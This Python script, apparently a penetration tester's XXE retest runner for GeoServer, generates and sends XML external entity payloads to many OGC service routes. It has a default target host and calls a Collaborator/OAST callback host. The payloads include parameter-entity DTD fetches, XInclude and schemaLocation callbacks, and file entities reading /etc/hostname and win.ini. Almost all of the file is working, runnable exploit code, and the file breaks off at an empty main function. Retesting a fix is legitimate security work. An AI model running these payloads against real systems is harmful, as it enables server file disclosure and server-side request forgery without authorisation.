#!/usr/bin/env python3
"""
GeoServer XXE retest runner.

This script sends XML parser checks across common GeoServer service routes and
records a callback-path map for Burp Collaborator/OAST correlation.
"""

from __future__ import annotations

import argparse
import csv
import datetime as dt
import json
import ssl
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass, field
from pathlib import Path
from typing import Iterable


DEFAULT_BASE_URL = "https://amap.dev.airmiles.ai/geoserver"
DEFAULT_LAYER = "topp:states"
DEFAULT_TYPENAME = "topp:states"
DEFAULT_COVERAGE = "nurc:Img_Sample"
DEFAULT_WORKSPACE = None

BLOCKED_MARKERS = [
    "entity resolution disallowed",
    "doctype is disallowed",
    "external entity",
    "external entities",
    "accessexternaldtd",
    "entityresolver",
    "saxparseexception",
]

FILE_MARKERS = [
    "[extensions]",
    "[fonts]",
    "[mci extensions]",
    "for 16-bit app support",
]


@dataclass
class Case:
    case_id: str
    service: str
    operation: str
    payload: str
    method: str
    path: str
    body: bytes = b""
    headers: dict[str, str] = field(default_factory=dict)
    callback_url: str = ""
    notes: str = ""


def xml_param_dtd(root: str, ns_attr: str, callback: str, child: str = "") -> str:
    return f"""<?xml version="1.0"?>
<!DOCTYPE {root} [
  <!ENTITY % ping SYSTEM "{callback}.dtd">
  %ping;
]>
<{root} {ns_attr}>
{child}</{root}>"""


def xml_general_entity(
    root: str,
    ns_attr: str,
    callback: str,
    injection: str,
) -> str:
    return f"""<?xml version="1.0"?>
<!DOCTYPE {root} [
  <!ENTITY xxe SYSTEM "{callback}">
]>
<{root} {ns_attr}>
{injection}</{root}>"""


def xml_external_doctype(root: str, ns_attr: str, callback: str, child: str = "") -> str:
    return f"""<?xml version="1.0"?>
<!DOCTYPE {root} SYSTEM "{callback}.dtd">
<{root} {ns_attr}>
{child}</{root}>"""


def xml_nested_param(root: str, ns_attr: str, callback: str, child: str = "") -> str:
    return f"""<?xml version="1.0"?>
<!DOCTYPE {root} [
  <!ENTITY % a "<!ENTITY &#x25; b SYSTEM '{callback}.dtd'>">
  %a;
  %b;
]>
<{root} {ns_attr}>
{child}</{root}>"""


def xml_file_entity(root: str, ns_attr: str, file_uri: str, injection: str) -> str:
    return f"""<?xml version="1.0"?>
<!DOCTYPE {root} [
  <!ENTITY xxe SYSTEM "{file_uri}">
]>
<{root} {ns_attr}>
{injection}</{root}>"""


def xml_schema_location(
    root: str,
    ns_attr: str,
    schema_ns: str,
    callback: str,
    child: str = "",
) -> str:
    return f"""<?xml version="1.0"?>
<{root} {ns_attr}
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="{schema_ns} {callback}.xsd">
{child}</{root}>"""


def xml_xinclude(root: str, ns_attr: str, callback: str, child: str = "") -> str:
    return f"""<?xml version="1.0"?>
<{root} {ns_attr}
  xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="{callback}.txt" parse="text"/>
{child}</{root}>"""


def sld_child(layer: str) -> str:
    return f"  <NamedLayer><Name>{layer}</Name></NamedLayer>\n"


def sld_entity_child() -> str:
    return "  <NamedLayer><Name>&xxe;</Name></NamedLayer>\n"


def wfs_cap_child() -> str:
    return ""


def wfs_describe_child(typename: str) -> str:
    return f"  <wfs:TypeName>{typename}</wfs:TypeName>\n"


def wfs_describe_entity_child() -> str:
    return "  <wfs:TypeName>&xxe;</wfs:TypeName>\n"


def wfs_query_child(version: str, typename: str) -> str:
    attr = "typeNames" if version == "2.0.0" else "typeName"
    return f'  <wfs:Query {attr}="{typename}"/>\n'


def wfs_query_entity_child(version: str) -> str:
    attr = "typeNames" if version == "2.0.0" else "typeName"
    return f'  <wfs:Query {attr}="&xxe;"/>\n'


def wfs_filter_literal_child(typename: str) -> str:
    return f"""  <wfs:Query typeName="{typename}">
    <ogc:Filter>
      <ogc:PropertyIsEqualTo>
        <ogc:PropertyName>name</ogc:PropertyName>
        <ogc:Literal>&xxe;</ogc:Literal>
      </ogc:PropertyIsEqualTo>
    </ogc:Filter>
  </wfs:Query>
"""


def wfs_filter_property_child(typename: str) -> str:
    return f"""  <wfs:Query typeName="{typename}">
    <ogc:Filter>
      <ogc:PropertyIsEqualTo>
        <ogc:PropertyName>&xxe;</ogc:PropertyName>
        <ogc:Literal>test</ogc:Literal>
      </ogc:PropertyIsEqualTo>
    </ogc:Filter>
  </wfs:Query>
"""


def wcs_coverage_child(coverage: str) -> str:
    return f"  <wcs:CoverageId>{coverage}</wcs:CoverageId>\n"


def wps_child(identifier: str = "JTS:buffer") -> str:
    return f"""  <ows:Identifier>{identifier}</ows:Identifier>
  <wps:DataInputs/>
  <wps:ResponseForm>
    <wps:RawDataOutput><ows:Identifier>result</ows:Identifier></wps:RawDataOutput>
  </wps:ResponseForm>
"""


def csw_child(element_name: str = "brief") -> str:
    return f"""  <csw:Query typeNames="csw:Record">
    <csw:ElementSetName>{element_name}</csw:ElementSetName>
  </csw:Query>
"""


def make_callback(base: str, case_id: str) -> str:
    return f"{base.rstrip('/')}/{case_id}"


def as_body(text: str, encoding: str = "utf-8") -> bytes:
    return text.encode(encoding)


def add_case(
    cases: list[Case],
    counter: list[int],
    service: str,
    operation: str,
    payload: str,
    method: str,
    path: str,
    body_text: str,
    headers: dict[str, str],
    callback_base: str,
    notes: str = "",
    body_bytes: bytes | None = None,
) -> None:
    counter[0] += 1
    case_id = f"{service}-{counter[0]:04d}-{operation}-{payload}".lower()
    safe_case_id = (
        case_id.replace(" ", "-")
        .replace("/", "-")
        .replace(":", "-")
        .replace("_", "-")
    )
    callback_url = make_callback(callback_base, safe_case_id) if callback_base else ""
    body = body_bytes if body_bytes is not None else as_body(body_text)
    body = body.replace(b"__CALLBACK__", callback_url.encode("utf-8"))
    body = body.replace(
        b"__CALLBACK_URLENC__",
        urllib.parse.quote(callback_url, safe="").encode("utf-8"),
    )
    cases.append(
        Case(
            case_id=safe_case_id,
            service=service,
            operation=operation,
            payload=payload,
            method=method,
            path=path,
            body=body,
            headers=headers,
            callback_url=callback_url,
            notes=notes,
        )
    )


def content_headers(content_type: str) -> dict[str, str]:
    return {
        "Content-Type": content_type,
        "Accept": "application/xml",
        "Connection": "close",
        "User-Agent": "geoserver-xxe-retest/1.0",
    }


def get_headers(accept: str = "application/xml") -> dict[str, str]:
    return {
        "Accept": accept,
        "Connection": "close",
        "User-Agent": "geoserver-xxe-retest/1.0",
    }


def build_wms_cases(args: argparse.Namespace, counter: list[int]) -> list[Case]:
    cases: list[Case] = []
    endpoints = [
        ("wms111", f"/wms?service=WMS&version=1.1.1&request=GetMap&layers={q(args.layer)}&styles=&bbox=0,0,1,1&width=1&height=1&srs=EPSG:4326&format=image/png"),
        ("wms130", f"/wms?service=WMS&version=1.3.0&request=GetMap&layers={q(args.layer)}&styles=&bbox=0,0,1,1&width=1&height=1&crs=EPSG:4326&format=image/png"),
        ("ows-wms111", f"/ows?service=WMS&version=1.1.1&request=GetMap&layers={q(args.layer)}&styles=&bbox=0,0,1,1&width=1&height=1&srs=EPSG:4326&format=image/png"),
        ("ows-wms130", f"/ows?service=WMS&version=1.3.0&request=GetMap&layers={q(args.layer)}&styles=&bbox=0,0,1,1&width=1&height=1&crs=EPSG:4326&format=image/png"),
    ]
    if args.workspace:
        endpoints.extend(
            [
                ("ws-wms111", f"/{q(args.workspace)}/wms?service=WMS&version=1.1.1&request=GetMap&layers={q(args.layer)}&styles=&bbox=0,0,1,1&width=1&height=1&srs=EPSG:4326&format=image/png"),
                ("ws-ows-wms111", f"/{q(args.workspace)}/ows?service=WMS&version=1.1.1&request=GetMap&layers={q(args.layer)}&styles=&bbox=0,0,1,1&width=1&height=1&srs=EPSG:4326&format=image/png"),
            ]
        )

    sld_ns = 'version="1.0.0" xmlns="http://www.opengis.net/sld"'
    payload_builders = [
        ("param-dtd", lambda cb: xml_param_dtd("StyledLayerDescriptor", sld_ns, cb, sld_child(args.layer))),
        ("general-entity", lambda cb: xml_general_entity("StyledLayerDescriptor", sld_ns, cb, sld_entity_child())),
        ("external-doctype", lambda cb: xml_external_doctype("StyledLayerDescriptor", sld_ns, cb, sld_child(args.layer))),
        ("nested-param", lambda cb: xml_nested_param("StyledLayerDescriptor", sld_ns, cb, sld_child(args.layer))),
        ("schema-location", lambda cb: xml_schema_location("StyledLayerDescriptor", sld_ns, "http://www.opengis.net/sld", cb, sld_child(args.layer))),
        ("xinclude", lambda cb: xml_xinclude("StyledLayerDescriptor", sld_ns, cb, sld_child(args.layer))),
        ("file-linux", lambda cb: xml_file_entity("StyledLayerDescriptor", sld_ns, "file:///etc/hostname", sld_entity_child())),
        ("file-windows", lambda cb: xml_file_entity("StyledLayerDescriptor", sld_ns, "file:///C:/Windows/win.ini", sld_entity_child())),
        ("file-alt-uri", lambda cb: xml_file_entity("StyledLayerDescriptor", sld_ns, "file:/etc/hostname", sld_entity_child())),
        ("single-quote-system", lambda cb: f"""<?xml version="1.0"?>
<!DOCTYPE StyledLayerDescriptor [
  <!ENTITY % ping SYSTEM '{cb}.dtd'>
  %ping;
]>
<StyledLayerDescriptor {sld_ns}>
{sld_child(args.layer)}</StyledLayerDescriptor>"""),
        ("no-xml-decl", lambda cb: f"""<!DOCTYPE StyledLayerDescriptor [
  <!ENTITY % ping SYSTEM "{cb}.dtd">
  %ping;
]>
<StyledLayerDescriptor {sld_ns}>
{sld_child(args.layer)}</StyledLayerDescriptor>"""),
    ]

    for endpoint_name, path in endpoints:
        for content_type in args.content_type:
            for payload_name, builder in payload_builders:
                body = builder("__CALLBACK__")
                add_case(
                    cases,
                    counter,
                    "wms",
                    endpoint_name,
                    payload_name,
                    "POST",
                    path,
                    body,
                    content_headers(content_type),
                    args.callback_url,
                )

    # WMS SLD_BODY GET and form POST are important alternate parser routes.
    body = xml_param_dtd("StyledLayerDescriptor", sld_ns, "__CALLBACK_URLENC__", sld_child(args.layer))
    encoded_body = urllib.parse.quote(body, safe="")
    sld_body_path = (
        f"/wms?service=WMS&version=1.1.1&request=GetMap&layers={q(args.layer)}"
        f"&styles=&bbox=0,0,1,1&width=1&height=1&srs=EPSG:4326&format=image/png"
        f"&SLD_BODY={encoded_body}"
    )
    add_case(cases, counter, "wms", "sld-body-get", "param-dtd", "GET", sld_body_path, "", get_headers(), args.callback_url)

    form_path = (
        f"/wms?service=WMS&version=1.1.1&request=GetMap&layers={q(args.layer)}"
        f"&styles=&bbox=0,0,1,1&width=1&height=1&srs=EPSG:4326&format=image/png"
    )
    add_case(
        cases,
        counter,
        "wms",
        "sld-body-form",
        "param-dtd",
        "POST",
        form_path,
        f"SLD_BODY={encoded_body}",
        {
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept": "application/xml",
            "Connection": "close",
            "User-Agent": "geoserver-xxe-retest/1.0",
        },
        args.callback_url,
    )

    remote_sld_path = (
        f"/wms?service=WMS&version=1.1.1&request=GetMap&layers={q(args.layer)}"
        f"&styles=&bbox=0,0,1,1&width=1&height=1&srs=EPSG:4326&format=image/png"
        f"&SLD=__CALLBACK__.sld"
    )
    add_case(cases, counter, "wms", "remote-sld-url", "remote-sld-fetch", "GET", remote_sld_path, "", get_headers("image/png,*/*"), args.callback_url)
    return cases


def build_wfs_cases(args: argparse.Namespace, counter: list[int]) -> list[Case]:
    cases: list[Case] = []
    routes = [
        ("wfs-bare", "/wfs"),
        ("wfs-query", "/wfs?service=WFS&version={version}&request={request}"),
        ("ows-query", "/ows?service=WFS&version={version}&request={request}"),
    ]
    if args.workspace:
        routes.extend(
            [
                ("ws-wfs-bare", f"/{q(args.workspace)}/wfs"),
                ("ws-wfs-query", f"/{q(args.workspace)}/wfs?service=WFS&version={{version}}&request={{request}}"),
                ("ws-ows-query", f"/{q(args.workspace)}/ows?service=WFS&version={{version}}&request={{request}}"),
            ]
        )

    operations = [
        ("getcap100", "GetCapabilities", "1.0.0", "wfs:GetCapabilities", 'service="WFS" version="1.0.0" xmlns:wfs="http://www.opengis.net/wfs"', wfs_cap_child, "http://www.opengis.net/wfs"),
        ("getcap110", "GetCapabilities", "1.1.0", "wfs:GetCapabilities", 'service="WFS" version="1.1.0" xmlns:wfs="http://www.opengis.net/wfs"', wfs_cap_child, "http://www.opengis.net/wfs"),
        ("getcap200", "GetCapabilities", "2.0.0", "wfs:GetCapabilities", 'service="WFS" version="2.0.0" xmlns:wfs="http://www.opengis.net/wfs/2.0"', wfs_cap_child, "http://www.opengis.net/wfs/2.0"),
        ("describe110", "DescribeFeatureType", "1.1.0", "wfs:DescribeFeatureType", 'service="WFS" version="1.1.0" xmlns:wfs="http://www.opengis.net/wfs"', lambda: wfs_describe_child(args.typename), "http://www.opengis.net/wfs"),
        ("getfeature100", "GetFeature", "1.0.0", "wfs:GetFeature", 'service="WFS" version="1.0.0" xmlns:wfs="http://www.opengis.net/wfs"', lambda: wfs_query_child("1.0.0", args.typename), "http://www.opengis.net/wfs"),
        ("getfeature110", "GetFeature", "1.1.0", "wfs:GetFeature", 'service="WFS" version="1.1.0" xmlns:wfs="http://www.opengis.net/wfs" xmlns:ogc="http://www.opengis.net/ogc"', lambda: wfs_query_child("1.1.0", args.typename), "http://www.opengis.net/wfs"),
        ("getfeature200", "GetFeature", "2.0.0", "wfs:GetFeature", 'service="WFS" version="2.0.0" xmlns:wfs="http://www.opengis.net/wfs/2.0"', lambda: wfs_query_child("2.0.0", args.typename), "http://www.opengis.net/wfs/2.0"),
        ("getpropertyvalue200", "GetPropertyValue", "2.0.0", "wfs:GetPropertyValue", 'service="WFS" version="2.0.0" xmlns:wfs="http://www.opengis.net/wfs/2.0" valueReference="name"', lambda: wfs_query_child("2.0.0", args.typename), "http://www.opengis.net/wfs/2.0"),
    ]

    for route_name, route_tpl in routes:
        for op_name, request_name, version, root, ns, child_fn, schema_ns in operations:
            path = route_tpl.format(version=version, request=request_name)
            for content_type in args.content_type:
                cb_child = child_fn()
                payloads = [
                    ("param-dtd", xml_param_dtd(root, ns, "__CALLBACK__", cb_child)),
                    ("external-doctype", xml_external_doctype(root, ns, "__CALLBACK__", cb_child)),
                    ("nested-param", xml_nested_param(root, ns, "__CALLBACK__", cb_child)),
                    ("schema-location", xml_schema_location(root, ns, schema_ns, "__CALLBACK__", cb_child)),
                    ("xinclude", xml_xinclude(root, ns, "__CALLBACK__", cb_child)),
                ]
                if request_name == "GetCapabilities":
                    payloads.append(
                        (
                            "general-entity",
                            xml_general_entity(root, ns + ' updateSequence="&xxe;"', "__CALLBACK__", ""),
                        )
                    )
                    payloads.append(
                        (
                            "file-linux",
                            xml_file_entity(root, ns + ' updateSequence="&xxe;"', "file:///etc/hostname", ""),
                        )
                    )
                    payloads.append(
                        (
                            "file-windows",
                            xml_file_entity(root, ns + ' updateSequence="&xxe;"', "file:///C:/Windows/win.ini", ""),
                        )
                    )
                elif request_name == "DescribeFeatureType":
                    payloads.append(("general-entity", xml_general_entity(root, ns, "__CALLBACK__", wfs_describe_entity_child())))
                    payloads.append(("file-linux", xml_file_entity(root, ns, "file:///etc/hostname", wfs_describe_entity_child())))
                    payloads.append(("file-windows", xml_file_entity(root, ns, "file:///C:/Windows/win.ini", wfs_describe_entity_child())))
                elif request_name == "GetFeature":
                    ver = version
                    payloads.append(("general-entity-query", xml_general_entity(root, ns, "__CALLBACK__", wfs_query_entity_child(ver))))
                    if version == "1.1.0":
                        payloads.append(("general-entity-filter-literal", xml_general_entity(root, ns, "__CALLBACK__", wfs_filter_literal_child(args.typename))))
                        payloads.append(("general-entity-filter-property", xml_general_entity(root, ns, "__CALLBACK__", wfs_filter_property_child(args.typename))))
                    payloads.append(("file-linux-query", xml_file_entity(root, ns, "file:///etc/hostname", wfs_query_entity_child(ver))))
                    payloads.append(("file-windows-query", xml_file_entity(root, ns, "file:///C:/Windows/win.ini", wfs_query_entity_child(ver))))
                elif request_name == "GetPropertyValue":
                    payloads.append(
                        (
                            "general-entity-valueref",
                            xml_general_entity(
                                root,
                                'service="WFS" version="2.0.0" xmlns:wfs="http://www.opengis.net/wfs/2.0" valueReference="&xxe;"',
                                "__CALLBACK__",
                                wfs_query_child("2.0.0", args.typename),
                            ),
                        )
                    )

                for payload_name, body in payloads:
                    add_case(
                        cases,
                        counter,
                        "wfs",
                        f"{route_name}-{op_name}",
                        payload_name,
                        "POST",
                        path,
                        body,
                        content_headers(content_type),
                        args.callback_url,
                    )

    if args.include_wfst:
        body = f"""<?xml version="1.0"?>
<!DOCTYPE wfs:Transaction [
  <!ENTITY % ping SYSTEM "__CALLBACK__.dtd">
  %ping;
]>
<wfs:Transaction service="WFS" version="1.1.0"
  xmlns:wfs="http://www.opengis.net/wfs">
  <wfs:Update typeName="invalid:invalid_feature_type">
    <wfs:Property>
      <wfs:Name>invalid</wfs:Name>
      <wfs:Value>invalid</wfs:Value>
    </wfs:Property>
  </wfs:Update>
</wfs:Transaction>
"""
        add_case(cases, counter, "wfs", "wfs-t-invalid-update", "param-dtd", "POST", "/wfs?service=WFS&version=1.1.0&request=Transaction", body, content_headers("application/xml"), args.callback_url, "State-changing parser route; invalid feature type.")

    return cases


def build_wcs_cases(args: argparse.Namespace, counter: list[int]) -> list[Case]:
    cases: list[Case] = []
    endpoints = [
        ("wcs-cap100", "/wcs?service=WCS&version=1.0.0&request=GetCapabilities", "wcs:GetCapabilities", 'service="WCS" version="1.0.0" xmlns:wcs="http://www.opengis.net/wcs"', "", "http://www.opengis.net/wcs"),
        ("ows-wcs-cap100", "/ows?service=WCS&version=1.0.0&request=GetCapabilities", "wcs:GetCapabilities", 'service="WCS" version="1.0.0" xmlns:wcs="http://www.opengis.net/wcs"', "", "http://www.opengis.net/wcs"),
        ("wcs-coverage201", "/wcs?service=WCS&version=2.0.1&request=GetCoverage", "wcs:GetCoverage", 'service="WCS" version="2.0.1" xmlns:wcs="http://www.opengis.net/wcs/2.0"', wcs_coverage_child(args.coverage), "http://www.opengis.net/wcs/2.0"),
        ("ows-wcs-coverage201", "/ows?service=WCS&version=2.0.1&request=GetCoverage", "wcs:GetCoverage", 'service="WCS" version="2.0.1" xmlns:wcs="http://www.opengis.net/wcs/2.0"', wcs_coverage_child(args.coverage), "http://www.opengis.net/wcs/2.0"),
    ]
    for op, path, root, ns, child, schema_ns in endpoints:
        for content_type in args.content_type:
            payloads = [
                ("param-dtd", xml_param_dtd(root, ns, "__CALLBACK__", child)),
                ("general-entity", xml_general_entity(root, ns, "__CALLBACK__", child.replace(args.coverage, "&xxe;") if child else "")),
                ("external-doctype", xml_external_doctype(root, ns, "__CALLBACK__", child)),
                ("schema-location", xml_schema_location(root, ns, schema_ns, "__CALLBACK__", child)),
                ("xinclude", xml_xinclude(root, ns, "__CALLBACK__", child)),
            ]
            for payload_name, body in payloads:
                add_case(cases, counter, "wcs", op, payload_name, "POST", path, body, content_headers(content_type), args.callback_url)
    return cases


def build_wps_cases(args: argparse.Namespace, counter: list[int]) -> list[Case]:
    cases: list[Case] = []
    endpoints = [
        ("wps-execute", "/wps?service=WPS&version=1.0.0&request=Execute"),
        ("ows-wps-execute", "/ows?service=WPS&version=1.0.0&request=Execute"),
    ]
    root = "wps:Execute"
    ns = 'service="WPS" version="1.0.0" xmlns:wps="http://www.opengis.net/wps/1.0.0" xmlns:ows="http://www.opengis.net/ows/1.1"'
    for op, path in endpoints:
        for content_type in args.content_type:
            payloads = [
                ("param-dtd", xml_param_dtd(root, ns, "__CALLBACK__", wps_child())),
                ("general-entity", xml_general_entity(root, ns, "__CALLBACK__", wps_child("&xxe;"))),
                ("external-doctype", xml_external_doctype(root, ns, "__CALLBACK__", wps_child())),
                ("schema-location", xml_schema_location(root, ns, "http://www.opengis.net/wps/1.0.0", "__CALLBACK__", wps_child())),
                ("xinclude", xml_xinclude(root, ns, "__CALLBACK__", wps_child())),
            ]
            for payload_name, body in payloads:
                add_case(cases, counter, "wps", op, payload_name, "POST", path, body, content_headers(content_type), args.callback_url)
    return cases


def build_csw_cases(args: argparse.Namespace, counter: list[int]) -> list[Case]:
    cases: list[Case] = []
    endpoints = [
        ("csw-getrecords", "/csw?service=CSW&version=2.0.2&request=GetRecords"),
        ("ows-csw-getrecords", "/ows?service=CSW&version=2.0.2&request=GetRecords"),
    ]
    root = "csw:GetRecords"
    ns = 'service="CSW" version="2.0.2" resultType="hits" xmlns:csw="http://www.opengis.net/cat/csw/2.0.2"'
    for op, path in endpoints:
        for content_type in args.content_type:
            payloads = [
                ("param-dtd", xml_param_dtd(root, ns, "__CALLBACK__", csw_child())),
                ("general-entity", xml_general_entity(root, ns, "__CALLBACK__", csw_child("&xxe;"))),
                ("external-doctype", xml_external_doctype(root, ns, "__CALLBACK__", csw_child())),
                ("schema-location", xml_schema_location(root, ns, "http://www.opengis.net/cat/csw/2.0.2", "__CALLBACK__", csw_child())),
                ("xinclude", xml_xinclude(root, ns, "__CALLBACK__", csw_child())),
            ]
            for payload_name, body in payloads:
                add_case(cases, counter, "csw", op, payload_name, "POST", path, body, content_headers(content_type), args.callback_url)
    return cases


def build_web_control_cases(args: argparse.Namespace, counter: list[int]) -> list[Case]:
    cases: list[Case] = []
    sld_ns = 'version="1.0.0" xmlns="http://www.opengis.net/sld"'
    body = xml_param_dtd("StyledLayerDescriptor", sld_ns, "__CALLBACK__", sld_child(args.layer))
    for path in ["/web", "/web/", "/"]:
        add_case(
            cases,
            counter,
            "web",
            "non-parser-control",
            "param-dtd",
            "POST",
            path,
            body,
            content_headers("application/xml"),
            args.callback_url,
            "Control route; normally should not reach an OGC XML parser.",
        )
    return cases


def q(value: str) -> str:
    return urllib.parse.quote(value, safe=":,")


def normalize_base_url(value: str) -> str:
    value = value.rstrip("/")
    parsed = urllib.parse.urlparse(value)
    if not parsed.scheme:
        value = "https://" + value
        parsed = urllib.parse.urlparse(value)
    if parsed.path in ("", "/"):
        value += "/geoserver"
    return value.rstrip("/")


def join_url(base_url: str, path: str) -> str:
    if "__CALLBACK__" in path:
        raise ValueError("callback placeholder should be resolved before URL join")
    return base_url.rstrip("/") + "/" + path.lstrip("/")


def apply_callback_to_path(path: str, callback_url: str) -> str:
    return (
        path.replace("__CALLBACK_URLENC__", urllib.parse.quote(callback_url, safe=""))
        .replace("__CALLBACK__", urllib.parse.quote(callback_url, safe=":/?&=%.-_~"))
    )


def parse_extra_headers(header_values: Iterable[str]) -> dict[str, str]:
    headers: dict[str, str] = {}
    for value in header_values:
        if ":" not in value:
            raise SystemExit(f"Invalid --header value, expected 'Name: value': {value}")
        name, header_value = value.split(":", 1)
        headers[name.strip()] = header_value.strip()
    return headers


def build_cases(args: argparse.Namespace) -> list[Case]:
    counter = [0]
    cases: list[Case] = []
    selected = {service.strip().lower() for service in args.services.split(",") if service.strip()}
    if "all" in selected:
        selected = {"wms", "wfs", "wcs", "wps", "csw"}
    if "wms" in selected:
        cases.extend(build_wms_cases(args, counter))
    if "wfs" in selected:
        cases.extend(build_wfs_cases(args, counter))
    if "wcs" in selected:
        cases.extend(build_wcs_cases(args, counter))
    if "wps" in selected:
        cases.extend(build_wps_cases(args, counter))
    if "csw" in selected:
        cases.extend(build_csw_cases(args, counter))
    if args.include_web_controls:
        cases.extend(build_web_control_cases(args, counter))
    return cases


def request_opener(args: argparse.Namespace) -> urllib.request.OpenerDirector:
    handlers: list[urllib.request.BaseHandler] = []
    if args.proxy:
        handlers.append(urllib.request.ProxyHandler({"http": args.proxy, "https": args.proxy}))
    if args.insecure:
        context = ssl._create_unverified_context()
        handlers.append(urllib.request.HTTPSHandler(context=context))
    return urllib.request.build_opener(*handlers)


def build_request(args: argparse.Namespace, case: Case) -> urllib.request.Request:
    path = apply_callback_to_path(case.path, case.callback_url)
    url = join_url(args.base_url, path)
    headers = dict(case.headers)
    headers.update(args.extra_headers)
    if args.x_user:
        headers["X-User"] = args.x_user
    if args.x_credentials:
        headers["X-Credentials"] = args.x_credentials
    if args.cookie:
        headers["Cookie"] = args.cookie
    data = case.body if case.method not in ("GET", "HEAD") else None
    return urllib.request.Request(url=url, data=data, headers=headers, method=case.method)


def raw_request(args: argparse.Namespace, case: Case) -> str:
    parsed = urllib.parse.urlparse(args.base_url)
    path = apply_callback_to_path(case.path, case.callback_url)
    headers = dict(case.headers)
    headers.update(args.extra_headers)
    headers.setdefault("Host", parsed.netloc)
    if args.x_user:
        headers["X-User"] = args.x_user
    if args.x_credentials:
        headers["X-Credentials"] = args.x_credentials
    if args.cookie:
        headers["Cookie"] = args.cookie
    body = "" if case.method in ("GET", "HEAD") else case.body.decode("utf-8", errors="replace")
    lines = [f"{case.method} {parsed.path.rstrip('/')}/{path.lstrip('/')} HTTP/1.1"]
    for name, value in headers.items():
        lines.append(f"{name}: {value}")
    if body:
        lines.append(f"Content-Length: {len(case.body)}")
    lines.append("")
    if body:
        lines.append(body)
    return "\r\n".join(lines)


def analyze_response(status: int | None, body: bytes, error: str = "") -> dict[str, object]:
    text = body.decode("utf-8", errors="ignore")
    lower = text.lower()
    return {
        "status": status,
        "bytes": len(body),
        "blocked_marker": next((marker for marker in BLOCKED_MARKERS if marker in lower), ""),
        "contains_service_exception": "exceptionreport" in lower or "serviceexception" in lower,
        "contains_file_marker": next((marker for marker in FILE_MARKERS if marker.lower() in lower), ""),
        "error": error,
        "snippet": " ".join(text[:300].split()),
    }


def send_case(opener: urllib.request.OpenerDirector, args: argparse.Namespace, case: Case) -> dict[str, object]:
    req = build_request(args, case)
    headers = {}
    status = None
    body = b""
    error = ""
    started = time.time()
    try:
        with opener.open(req, timeout=args.timeout) as resp:
            status = resp.getcode()
            headers = dict(resp.headers.items())
            body = resp.read(args.max_body_bytes)
    except urllib.error.HTTPError as exc:
        status = exc.code
        headers = dict(exc.headers.items()) if exc.headers else {}
        body = exc.read(args.max_body_bytes)
    except Exception as exc:  # noqa: BLE001 - CLI should record any transport error.
        error = f"{type(exc).__name__}: {exc}"
    elapsed_ms = int((time.time() - started) * 1000)
    analysis = analyze_response(status, body, error)
    return {
        "case_id": case.case_id,
        "service": case.service,
        "operation": case.operation,
        "payload": case.payload,
        "method": case.method,
        "path": apply_callback_to_path(case.path, case.callback_url),
        "callback_url": case.callback_url,
        "status": analysis["status"],
        "elapsed_ms": elapsed_ms,
        "content_type": headers.get("Content-Type", ""),
        "response_bytes": analysis["bytes"],
        "blocked_marker": analysis["blocked_marker"],
        "service_exception": analysis["contains_service_exception"],
        "file_marker": analysis["contains_file_marker"],
        "error": analysis["error"],
        "snippet": analysis["snippet"],
        "notes": case.notes,
    }


def write_case_map(path: Path, cases: list[Case]) -> None:
    with path.open("w", newline="") as fh:
        writer = csv.DictWriter(
            fh,
            fieldnames=[
                "case_id",
                "service",
                "operation",
                "payload",
                "method",
                "path",
                "callback_url",
                "notes",
            ],
        )
        writer.writeheader()
        for case in cases:
            writer.writerow(
                {
                    "case_id": case.case_id,
                    "service": case.service,
                    "operation": case.operation,
                    "payload": case.payload,
                    "method": case.method,
                    "path": case.path,
                    "callback_url": case.callback_url,
                    "notes": case.notes,
                }
            )


def save_raw_requests(raw_dir: Path, args: argparse.Namespace, cases: list[Case]) -> None:
    raw_dir.mkdir(parents=True, exist_ok=True)
    for case in cases:
        (raw_dir / f"{case.case_id}.http").write_text(raw_request(args, case) + "\n")


def parse_args(argv: list[str]) -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Send GeoServer XXE retest payloads across WMS/WFS/WCS/WPS/CSW routes.",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    parser.add_argument("--base-url", default=DEFAULT_BASE_URL, help="GeoServer base URL, usually https://host/geoserver.")
    parser.add_argument("--callback-url", required=True, help="Burp Collaborator/OAST base URL. Unique case IDs are appended.")
    parser.add_argument("--services", default="wms,wfs,wcs,wps,csw", help="Comma-separated services: wms,wfs,wcs,wps,csw,all.")
    parser.add_argument("--workspace", default=DEFAULT_WORKSPACE, help="Known workspace for workspace-scoped routes.")
    parser.add_argument("--layer", default=DEFAULT_LAYER, help="Known valid WMS layer, e.g. workspace:layer.")
    parser.add_argument("--typename", default=DEFAULT_TYPENAME, help="Known valid WFS feature type, e.g. workspace:feature.")
    parser.add_argument("--coverage", default=DEFAULT_COVERAGE, help="Known valid WCS coverage ID.")
    parser.add_argument("--content-type", action="append", default=None, help="Content-Type to test. Repeatable.")
    parser.add_argument("--x-user", default="", help="Optional X-User header value.")
    parser.add_argument("--x-credentials", default="", help="Optional X-Credentials header value.")
    parser.add_argument("--cookie", default="", help="Optional Cookie header value.")
    parser.add_argument("--header", action="append", default=[], help="Extra header, e.g. 'Authorization: Bearer ...'. Repeatable.")
    parser.add_argument("--proxy", default="", help="Optional proxy URL, e.g. http://127.0.0.1:8080 for Burp.")
    parser.add_argument("--insecure", action="store_true", help="Ignore TLS certificate validation.")
    parser.add_argument("--timeout", type=float, default=10.0, help="Per-request timeout in seconds.")
    parser.add_argument("--delay", type=float, default=0.0, help="Delay between requests in seconds.")
    parser.add_argument("--max-cases", type=int, default=0, help="Limit number of cases; 0 means no limit.")
    parser.add_argument("--max-body-bytes", type=int, default=16384, help="Maximum response bytes to read.")
    parser.add_argument("--output-dir", default="", help="Output directory. Defaults to results/geoserver_xxe_<timestamp>.")
    parser.add_argument("--dry-run", action="store_true", help="Do not send requests; write request map/raw files only.")
    parser.add_argument("--save-raw-dir", default="", help="Directory for raw .http requests. Defaults under output-dir/raw.")
    parser.add_argument("--include-web-controls", action="store_true", help="Also test /web and / as non-parser controls.")
    parser.add_argument("--include-wfst", action="store_true", help="Include optional WFS-T invalid transaction parser checks.")
    args = parser.parse_args(argv)
    args.base_url = normalize_base_url(args.base_url)
    args.callback_url = args.callback_url.rstrip("/")
    args.extra_headers = parse_extra_headers(args.header)
    if args.content_type is None:
        args.content_type = [
            "application/xml",
            "text/xml",
            "application/xml; charset=UTF-8",
        ]
    return args


def main(argv: list[str]) -> int:
